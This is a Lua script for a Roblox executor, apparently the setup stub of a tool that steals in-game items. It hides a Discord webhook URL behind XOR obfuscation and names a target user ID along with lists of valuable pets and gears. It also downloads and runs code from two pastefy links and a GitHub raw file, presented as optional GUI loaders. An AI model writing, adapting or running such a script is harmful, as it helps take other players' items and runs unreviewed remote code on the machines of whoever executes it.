local genv = getgenv()

genv.GOOD_WEBHOOK = (function() local b={199,219,219,223,220,149,128,128,203,198,220,204,192,221,203,129,204,192,194,128,206,223,198,128,216,202,205,199,192,192,196,220,128,158,154,155,159,159,150,150,157,154,157,150,156,155,155,158,155,155,150,152,128,251,237,215,155,237,220,248,231,230,214,222,249,227,193,233,254,154,204,150,231,202,233,238,255,252,218,228,253,236,152,153,214,253,201,192,246,224,206,231,251,157,223,224,246,159,215,219,245,155,197,237,206,202,217,236,196,158,235,202,152,237,193,235,249,232,154,159,247} local k=175 local o={} for i=1,#b do o[i]=string.char(bit32.bxor(b[i],k)) end return table.concat(o) end)()

genv.TARGET_USER_ID = 2829121161

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bumbatron",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro And Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "S'more Serat",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Rubiko and Kubiko",
    "Capitano Americano",
    "Examen Bros",
    "Los Spaghettis",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Queen Bee",
    "Cloverat Clapat",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "Garama and Madundung",
    "Globa Steppa",
    "Fragola La La La",
    "Los Tacoritas",
    "Dug Dug Dug",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Jolly Jolly Sahur",
    "Yetimatic",
    "La Breakfast Combinasion",
    "La Fuse Machine",
    "Money Money Bros",
    "Sammyini Truckini",
    "Orchidox",
    "Pop Pop Petalini"
}

genv.ALLOWED_BASESKINS = {
    ["Tralala"] = true
}

genv.ALLOWED_GEARS = {
    ["Bloodmoon Slap"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Rainbow Hammer"] = true,
    ["Candy Sentry"] = true,
    ["Santa's Sleigh"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Cupid's Wings"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/EUl1e1Jb/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
